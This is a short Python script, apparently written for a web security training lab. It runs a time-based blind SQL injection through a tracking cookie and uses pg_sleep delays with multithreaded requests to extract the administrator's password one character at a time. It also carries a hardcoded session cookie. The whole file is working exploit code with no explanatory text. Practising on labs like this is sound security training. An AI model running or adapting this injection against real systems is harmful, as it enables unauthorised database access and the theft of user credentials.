import requests
from datetime import timedelta
import threading

url = "https://0aa000820477a0ca83fcaf7700e9003a.web-security-academy.net/filter?category=Corporate+gifts"
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""
password_lock = threading.Lock()
found_event = threading.Event()

def test_char(char, position):
    global password

    headers = {
        "Cookie": f"TrackingId=WI0jIaCz0vjWOxw1'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{position + 1})='{password + char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=MGnqiBK4ksVegn4ZYF9E5DQ1hkMx07ze"
    }
    req = requests.get(url, headers=headers)
    
    if req.elapsed >= timedelta(seconds=10):
        with password_lock:
            password += char
            print(f"Found character: {char}")
            found_event.set()

while len(password) < 20:
    threads = []
    found_event.clear()
    
    for char in alphabet:
        t = threading.Thread(target=test_char, args=(char, len(password)))
        t.start()
        threads.append(t)
    
    found_event.wait()  # Wait for any thread to find a valid character
    
    # Stop all threads if a valid character is found
    for t in threads:
        t.join()

print(f"Password found: {password}")
